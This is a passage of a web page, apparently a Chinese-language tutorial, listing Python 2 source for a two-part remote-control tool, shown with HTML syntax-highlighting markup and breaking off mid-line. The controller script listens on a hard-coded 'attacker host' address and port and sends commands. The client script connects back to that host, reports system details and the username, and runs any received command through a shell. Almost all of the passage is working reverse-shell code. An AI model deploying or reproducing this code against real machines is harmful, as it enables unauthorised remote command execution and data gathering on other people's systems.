value">2</code><code class="python plain">]))</code></div><div class="line number167 index166 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"System Version: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">3</code><code class="python plain">]))</code></div><div class="line number168 index167 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Machine Architecture: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">4</code><code class="python plain">]))</code></div><div class="line number169 index168 alt2">&nbsp;</div><div class="line number170 index169 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"exit()"</code><code class="python plain">:</code></div><div class="line number171 index170 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">connection.send(</code><code class="python string">"exit()"</code><code class="python plain">)</code></div><div class="line number172 index171 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">,</code><code class="python string">" [+] "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"Shell Going Down"</code><code class="python plain">)</code></div><div class="line number173 index172 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number174 index173 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number175 index174 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"red"</code><code class="python plain">,</code><code class="python string">"[!] Unknown Command"</code><code class="python plain">)</code></div><div class="line number176 index175 alt1">&nbsp;</div><div class="line number177 index176 alt2"><code class="python comments"># 帮助函数</code></div><div class="line number178 index177 alt1"><code class="python keyword">def</code> <code class="python functions">help</code><code class="python plain">():</code></div><div class="line number179 index178 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">help_list </code><code class="python keyword">=</code> <code class="python plain">{}</code></div><div class="line number180 index179 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">help_list[</code><code class="python string">"sysinfo"</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"Display Remote System Information"</code></div><div class="line number181 index180 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">help_list[</code><code class="python string">"exec"</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"Execute Argument Ad Command On Remete Host"</code></div><div class="line number182 index181 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">help_list[</code><code class="python string">"cls"</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"Clears The Terminal"</code></div><div class="line number183 index182 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">help_list[</code><code class="python string">"help"</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"Prints this help message"</code></div><div class="line number184 index183 alt1">&nbsp;</div><div class="line number185 index184 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">return_str </code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"\n Command "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">" . "</code></div><div class="line number186 index185 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">return_str </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">, </code><code class="python string">" Description\n %s\n"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"gray"</code><code class="python plain">, </code><code class="python string">"-"</code> <code class="python keyword">*</code> <code class="python value">50</code><code class="python plain">)))</code></div><div class="line number187 index186 alt2">&nbsp;</div><div class="line number188 index187 alt1">&nbsp;</div><div class="line number189 index188 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">x </code><code class="python keyword">in</code> <code class="python functions">sorted</code><code class="python plain">(help_list):</code></div><div class="line number190 index189 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dec </code><code class="python keyword">=</code> <code class="python plain">help_list[x]</code></div><div class="line number191 index190 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">return_str </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python string">" "</code> <code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, x) </code><code class="python keyword">+</code> <code class="python string">" - "</code> <code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">, dec </code><code class="python keyword">+</code> <code class="python string">"\n"</code><code class="python plain">)</code></div><div class="line number192 index191 alt1">&nbsp;</div><div class="line number193 index192 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">return_str.rstrip(</code><code class="python string">"\n"</code><code class="python plain">)</code></div><div class="line number194 index193 alt1">&nbsp;</div><div class="line number195 index194 alt2"><code class="python comments"># 发送数据</code></div><div class="line number196 index195 alt1"><code class="python keyword">def</code> <code class="python plain">send_data(connection,data):</code></div><div class="line number197 index196 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number198 index197 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">connection.send(data)</code></div><div class="line number199 index198 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">socket.error as e:</code></div><div class="line number200 index199 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"red"</code><code class="python plain">,</code><code class="python string">"[ - ]"</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"Unable To Send Data"</code></div><div class="line number201 index200 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code></div><div class="line number202 index201 alt1">&nbsp;</div><div class="line number203 index202 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">connection.recv(</code><code class="python value">2048</code><code class="python plain">)</code></div><div class="line number204 index203 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">total_size </code><code class="python keyword">=</code> <code class="python functions">long</code><code class="python plain">(result[:</code><code class="python value">16</code><code class="python plain">])</code></div><div class="line number205 index204 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">result[</code><code class="python value">16</code><code class="python plain">:]</code></div><div class="line number206 index205 alt1">&nbsp;</div><div class="line number207 index206 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">total_size &gt; </code><code class="python functions">len</code><code class="python plain">(result):</code></div><div class="line number208 index207 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">connection.recv(</code><code class="python value">2048</code><code class="python plain">)</code></div><div class="line number209 index208 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">data</code></div><div class="line number210 index209 alt1">&nbsp;</div><div class="line number211 index210 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp; <code class="python plain">result.rstrip(</code><code class="python string">"\n"</code><code class="python plain">)</code></div><div class="line number212 index211 alt1">&nbsp;</div><div class="line number213 index212 alt2"><code class="python comments"># 主控制函数</code></div><div class="line number214 index213 alt1"><code class="python keyword">def</code> <code class="python plain">main_control():</code></div><div class="line number215 index214 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number216 index215 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#host = sys.argv[1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 攻击者主机地址</code></div><div class="line number217 index216 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#port = int(sys.argv[2]) # 攻击者主机端口</code></div><div class="line number218 index217 alt1">&nbsp;</div><div class="line number219 index218 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">host </code><code class="python keyword">=</code> <code class="python string">"192.168.14.45"</code></div><div class="line number220 index219 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">port </code><code class="python keyword">=</code> <code class="python value">3800</code></div><div class="line number221 index220 alt2">&nbsp;</div><div class="line number222 index221 alt1">&nbsp;</div><div class="line number223 index222 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">Exception as e:</code></div><div class="line number224 index223 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"red"</code><code class="python plain">,</code><code class="python string">"[-]"</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"Socket Information Not Provided"</code></div><div class="line number225 index224 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number226 index225 alt1">&nbsp;</div><div class="line number227 index226 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">" [+]"</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">,</code><code class="python string">" Framework Standard Successfully"</code><code class="python plain">)</code></div><div class="line number228 index227 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">banner()</code></div><div class="line number229 index228 alt2">&nbsp;</div><div class="line number230 index229 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">socket.socket(socket.AF_INET,socket.SOCK_STREAM) </code><code class="python comments"># 安装套接字</code></div><div class="line number231 index230 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.bind((host,port))</code></div><div class="line number232 index231 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.listen(</code><code class="python value">5</code><code class="python plain">)</code></div><div class="line number233 index232 alt2">&nbsp;</div><div class="line number234 index233 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">host </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python plain">"":</code></div><div class="line number235 index234 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">host </code><code class="python keyword">=</code> <code class="python string">"localhost"</code></div><div class="line number236 index235 alt1">&nbsp;</div><div class="line number237 index236 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">" [info] "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">, </code><code class="python string">"Listening on %s%d ..."</code> <code class="python keyword">%</code> <code class="python plain">(host, port))</code></div><div class="line number238 index237 alt1">&nbsp;</div><div class="line number239 index238 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number240 index239 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn,addr </code><code class="python keyword">=</code> <code class="python plain">s.accept()</code></div><div class="line number241 index240 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">KeyboardInterrupt:</code></div><div class="line number242 index241 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">"\n\n "</code> <code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"red"</code><code class="python plain">, </code><code class="python string">"[-]"</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">, </code><code class="python string">" User Request An Interrupt"</code><code class="python plain">)</code></div><div class="line number243 index242 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python value">0</code><code class="python plain">)</code></div><div class="line number244 index243 alt1">&nbsp;</div><div class="line number245 index244 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">console(conn,</code><code class="python functions">str</code><code class="python plain">(addr[</code><code class="python value">0</code><code class="python plain">]))</code></div><div class="line number246 index245 alt1">&nbsp;</div><div class="line number247 index246 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.close() </code><code class="python comments"># 关闭套接字</code></div><div class="line number248 index247 alt1">&nbsp;</div><div class="line number249 index248 alt2"><code class="python keyword">if</code> <code class="python plain">__name__ </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"__main__"</code><code class="python plain">:</code></div><div class="line number250 index249 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">main_control()</code></div></div></td></tr></tbody></table><p><strong>connect_part2.py</strong></p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># -*- coding: utf-8 -*-</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">socket,subprocess as sp,sys,os,platform</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python comments"># 连接函数</code></div><div class="line number5 index4 alt2"><code class="python keyword">def</code> <code class="python plain">connect():</code></div><div class="line number6 index5 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># host&nbsp; = str(sys.argv[1])</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># port&nbsp; = int(sys.argv[2])</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">host </code><code class="python keyword">=</code> <code class="python string">"192.168.14.45"</code>&nbsp;&nbsp; <code class="python comments"># 测试IP</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">port </code><code class="python keyword">=</code> <code class="python value">3800</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code class="python comments"># 测试端口</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">Exception as e:</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number14 index13 alt1">&nbsp;</div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn </code><code class="python keyword">=</code> <code class="python plain">socket.socket(socket.AF_INET,socket.SOCK_STREAM)</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.connect((host,port))</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">=</code> <code class="python plain">""</code></div><div class="line number19 index18 alt2">&nbsp;</div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#for x in os.uname():</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">x </code><code class="python keyword">in</code> <code class="python plain">platform.uname():</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">x </code><code class="python keyword">+</code> <code class="python string">","</code></div><div class="line number23 index22 alt2">&nbsp;</div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 平台判断</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">platform.system() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Linux"</code><code class="python plain">:</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">os.getlogin()&nbsp; </code><code class="python comments"># Linux平台</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">platform.system() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Windows"</code><code class="python plain">:</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">os.getenv(</code><code class="python string">'username'</code><code class="python plain">)&nbsp; </code><code class="python comments"># Windows</code></div><div class="line number29 index28 alt2">&nbsp;</div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 发送数据</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.send(x_info)</code></div><div class="line number32 index31 alt1">&nbsp;</div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># 会话维持</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">interactive_session(conn)</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">conn.close()</code></div><div class="line number36 index35 alt1">&nbsp;</div><div class="line number37 index36 alt2"><code class="python comments"># 会话维持</code></div><div class="line number38 index37 alt1"><code class="python keyword">def</code> <code class="python plain">interactive_session(conn):</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python value">1</code><code class="python plain">:</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">command </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(conn.recv(</code><code class="python value">1024</code><code class="python plain">))</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">socket.error:</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number44 index43 alt1">&nbsp;</div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">command.split(</code><code class="python string">" "</code><code class="python plain">)[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"exec"</code><code class="python plain">:</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">res </code><code class="python keyword">=</code> <code class="python value">1</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">msg </code><code class="python keyword">=</code> <code class="python plain">""</code></div><div class="line number48 index47 alt1">&nbsp;</div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python functions">len</code><code class="python plain">(command.split(</code><code class="python string">" "</code><code class="python plain">)) &gt; res:</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">msg </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">command.split(</code><code class="python string">" "</code><code class="python plain">)[res] </code><code class="python keyword">+</code> <code class="python string">" "</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">res </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python value">1</code></div><div class="line number52 index51 alt1">&nbsp;</div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sh </code><code class="python keyword">=</code> <code class="python plain">sp.Popen(msg,shell</code><code class="python keyword">=</code><code class="python color1">True</code><code class="python plain">,</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">stdout</code><code class="python keyword">=</code> <code class="python plain">sp.PIPE,</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">stderr </code><code class="python keyword">=</code> <code class="python plain">sp.PIPE,</code></div><div class="line number56 index55 alt1"><code class="python 